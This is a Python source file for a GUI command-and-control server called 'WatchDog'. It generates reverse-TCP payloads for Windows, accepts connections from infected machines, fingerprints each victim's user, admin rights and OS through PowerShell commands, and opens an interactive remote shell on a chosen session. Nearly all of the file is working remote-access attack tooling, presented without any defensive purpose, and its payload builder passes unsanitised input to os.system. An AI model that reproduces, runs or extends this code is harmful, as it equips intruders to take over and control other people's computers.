import os
import time
import socket
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox

class WatchDogGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("WatchDog C2 Server")
        self.geometry("800x600")
        self.running = True
        self.WatchDog_Version = "0.1.0"
        
        self.data_clients = []
        self.current_client = None
        self.server_ip = "127.0.0.1"  # Default value
        
        # Initialize network first
        self.setup_network()
        self.create_widgets()
        
        threading.Thread(target=self.test_connections, daemon=True).start()

    def setup_network(self):
        try:
            self.s_f = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.s_f.connect(("8.8.8.8", 80))
            self.server_ip = self.s_f.getsockname()[0]
        except Exception as e:
            messagebox.showwarning("Network Warning", 
                f"Could not detect external IP: {str(e)}\nUsing localhost")
            self.server_ip = "127.0.0.1"
        
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.settimeout(2)

    def create_widgets(self):
        notebook = ttk.Notebook(self)
        notebook.pack(expand=True, fill='both')
        
        # Generate Tab
        generate_frame = ttk.Frame(notebook)
        self.create_generate_tab(generate_frame)
        notebook.add(generate_frame, text="Generate")
        
        # Server Tab
        server_frame = ttk.Frame(notebook)
        self.create_server_tab(server_frame)
        notebook.add(server_frame, text="Server")
        
        # Sessions Tab
        sessions_frame = ttk.Frame(notebook)
        self.create_sessions_tab(sessions_frame)
        notebook.add(sessions_frame, text="Sessions")
        
        # Log Tab
        log_frame = ttk.Frame(notebook)
        self.create_log_tab(log_frame)
        notebook.add(log_frame, text="Logs")

    def create_generate_tab(self, parent):
        ttk.Label(parent, text="Payload Type:").grid(row=0, column=0, padx=5, pady=5)
        self.payload_type = ttk.Combobox(parent, values=[
            "windows/powershell/reverse_tcp",
            "windows/batch/reverse_tcp",
            "windows/exe/reverse_tcp"
        ])
        self.payload_type.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(parent, text="LHOST:").grid(row=1, column=0, padx=5, pady=5)
        self.lhost = ttk.Entry(parent)
        self.lhost.insert(0, self.server_ip)
        self.lhost.grid(row=1, column=1, padx=5, pady=5)
        
        ttk.Label(parent, text="LPORT:").grid(row=2, column=0, padx=5, pady=5)
        self.lport = ttk.Entry(parent)
        self.lport.insert(0, "5050")
        self.lport.grid(row=2, column=1, padx=5, pady=5)
        
        generate_btn = ttk.Button(parent, text="Generate Payload", command=self.generate_payload)
        generate_btn.grid(row=3, column=0, columnspan=2, pady=10)

    def create_server_tab(self, parent):
        ttk.Label(parent, text="RHOST:").grid(row=0, column=0, padx=5, pady=5)
        self.rhost = ttk.Entry(parent)
        self.rhost.insert(0, self.server_ip)
        self.rhost.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(parent, text="RPORT:").grid(row=1, column=0, padx=5, pady=5)
        self.rport = ttk.Entry(parent)
        self.rport.insert(0, "5050")
        self.rport.grid(row=1, column=1, padx=5, pady=5)
        
        self.server_status = ttk.Label(parent, text="Server Status: Stopped", foreground='red')
        self.server_status.grid(row=2, column=0, columnspan=2, pady=5)
        
        self.start_btn = ttk.Button(parent, text="Start Server", command=self.toggle_server)
        self.start_btn.grid(row=3, column=0, columnspan=2, pady=10)

    def create_sessions_tab(self, parent):
        self.sessions_list = ttk.Treeview(parent, columns=('IP', 'User', 'Admin', 'OS'), show='headings')
        self.sessions_list.heading('IP', text='IP Address')
        self.sessions_list.heading('User', text='Username')
        self.sessions_list.heading('Admin', text='Admin')
        self.sessions_list.heading('OS', text='Operating System')
        self.sessions_list.pack(expand=True, fill='both', padx=5, pady=5)
        
        btn_frame = ttk.Frame(parent)
        btn_frame.pack(pady=5)
        
        ttk.Button(btn_frame, text="Refresh", command=self.update_sessions).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Interact", command=self.open_shell).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Disconnect", command=self.disconnect_client).pack(side=tk.LEFT, padx=5)

    def create_log_tab(self, parent):
        self.log_area = scrolledtext.ScrolledText(parent, wrap=tk.WORD)
        self.log_area.pack(expand=True, fill='both', padx=5, pady=5)

    def generate_payload(self):
        payload = self.payload_type.get()
        lhost = self.lhost.get()
        lport = self.lport.get()
        
        if not all([payload, lhost, lport]):
            messagebox.showerror("Error", "All fields are required!")
            return
        
        os.system(f"python {payload}.py {lhost} {lport}")
        self.log(f"Payload generated: {payload} {lhost}:{lport}")

    def toggle_server(self):
        if self.start_btn.cget('text') == 'Start Server':
            self.start_server()
        else:
            self.stop_server()
            
    def start_server(self):
        try:
            self.server_socket.bind((self.rhost.get(), int(self.rport.get())))
            self.server_socket.listen()
            self.server_status.config(text="Server Status: Running", foreground='green')
            self.start_btn.config(text="Stop Server")
            threading.Thread(target=self.listen_for_connections, daemon=True).start()
            self.log("Server started successfully")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start server: {str(e)}")
            
    def stop_server(self):
        self.running = False
        self.server_socket.close()
        self.server_status.config(text="Server Status: Stopped", foreground='red')
        self.start_btn.config(text="Start Server")
        self.log("Server stopped")
        
    def listen_for_connections(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                self.handle_new_connection(conn, addr)
            except socket.timeout:
                continue
            except OSError:
                break
            
    def handle_new_connection(self, conn, addr):
        user = self.cmd_WhoAmI(conn)
        admin = self.cmd_Check_Privileges(conn)
        os_info = self.cmd_OS_name(conn)
        
        self.data_clients.append({
            'conn': conn,
            'addr': addr,
            'user': user,
            'admin': admin,
            'os': os_info,
            'active': True
        })
        
        self.log(f"New connection from {addr[0]}: {user}@{os_info} (Admin: {admin})")
        self.update_sessions()

    def update_sessions(self):
        self.sessions_list.delete(*self.sessions_list.get_children())
        for client in self.data_clients:
            self.sessions_list.insert('', 'end', values=(
                client['addr'][0],
                client['user'],
                client['admin'],
                client['os']
            ))
            
    def open_shell(self):
        selected = self.sessions_list.selection()
        if not selected:
            return
            
        item = self.sessions_list.item(selected[0])
        client = next((c for c in self.data_clients if c['addr'][0] == item['values'][0]), None)
        
        if client:
            self.current_client = client
            self.create_shell_window(client)
            
    def create_shell_window(self, client):
        shell_win = tk.Toplevel(self)
        shell_win.title(f"Shell - {client['user']}@{client['addr'][0]}")
        
        output = scrolledtext.ScrolledText(shell_win, wrap=tk.WORD)
        output.pack(expand=True, fill='both', padx=5, pady=5)
        
        input_frame = ttk.Frame(shell_win)
        input_frame.pack(fill=tk.X, padx=5, pady=5)
        
        cmd_entry = ttk.Entry(input_frame)
        cmd_entry.pack(side=tk.LEFT, expand=True, fill=tk.X)
        
        def send_command():
            cmd = cmd_entry.get()
            if not cmd:
                return
                
            try:
                client['conn'].send(bytes(cmd, "utf-8"))
                output.insert(tk.END, f"> {cmd}\n")
                response = client['conn'].recv(4096).decode("utf-8")
                output.insert(tk.END, f"{response}\n")
            except Exception as e:
                output.insert(tk.END, f"Error: {str(e)}\n")
                
            cmd_entry.delete(0, tk.END)
            
        ttk.Button(input_frame, text="Send", command=send_command).pack(side=tk.LEFT, padx=5)
        
    def disconnect_client(self):
        selected = self.sessions_list.selection()
        if not selected:
            return
            
        item = self.sessions_list.item(selected[0])
        client = next((c for c in self.data_clients if c['addr'][0] == item['values'][0]), None)
        
        if client:
            client['conn'].close()
            self.data_clients.remove(client)
            self.update_sessions()
            self.log(f"Disconnected client: {item['values'][0]}")
            
    def test_connections(self):
        while self.running:
            time.sleep(10)
            for client in self.data_clients.copy():
                if not self.cmd_test_connection(client['conn']):
                    self.data_clients.remove(client)
                    self.log(f"Client disconnected: {client['addr'][0]}")
                    self.update_sessions()
                    
    def log(self, message):
        self.log_area.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_area.see(tk.END)
        
    def cmd_test_connection(self, conn):
        try:
            conn.send(bytes("Write-Output '   '", "utf-8"))
            conn.recv(64).decode("utf-8")
            return True
        except:
            return False
            
    def cmd_WhoAmI(self, conn):
        conn.send(bytes("whoami", "utf-8"))
        return conn.recv(64).decode("utf-8")[:-2]
        
    def cmd_Check_Privileges(self, conn):
        conn.send(bytes("([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)", "utf-8"))
        return conn.recv(16).decode("utf-8")[:-2]
        
    def cmd_OS_name(self, conn):
        conn.send(bytes("$osInfo = Get-CimInstance Win32_OperatingSystem; $osInfo.Caption", "utf-8"))
        return conn.recv(32).decode("utf-8")[:-2]

if __name__ == "__main__":
    app = WatchDogGUI()
    app.mainloop()